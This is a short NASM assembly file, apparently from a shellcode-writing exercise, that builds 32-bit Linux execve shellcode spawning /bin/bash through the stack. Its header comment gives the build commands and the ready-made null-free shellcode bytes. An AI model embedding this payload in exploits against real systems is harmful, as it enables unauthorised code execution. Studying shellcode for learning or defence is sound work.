; ExecveBashStack.asm
; by Abatchy
;
;   nasm -felf32 ExecveBashStack.asm && ld -o ExecveBashStack ExecveBashStack.o
; Generated shellcode: "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

global _start

section .text

_start:

    xor eax, eax
    push eax
    
    ; PUSH ////bin/bash (size: 12)
    push 0x68736162
    push 0x2f6e6962
    push 0x2f2f2f2f
    
    mov ebx, esp
    
    push eax
    mov edx, esp
    
    push ebx
    mov ecx, esp
    
    mov al, 0xb
    int 0x80
